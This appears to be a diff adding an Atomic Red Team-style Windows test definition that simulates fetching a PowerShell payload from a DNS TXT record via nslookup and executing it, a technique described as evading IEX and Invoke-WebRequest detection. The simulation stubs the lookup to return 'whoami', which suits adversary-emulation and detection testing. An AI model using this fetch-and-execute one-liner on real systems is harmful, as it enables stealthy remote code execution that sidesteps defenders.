@@ -1,0 +1,23 @@
+{
+  "id": "999bff6d-dc15-44c9-9f5c-e1051bfc86e1",
+  "name": "Abuse Nslookup with DNS Records",
+  "description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "0b9a81f7-07f7-4831-8b6a-b47281ff7e4d",
+      "type": "execute-command",
+      "data": {
+        "command": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { \u0026\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1059.001",
+    "atomic-red-team"
+  ]
+}
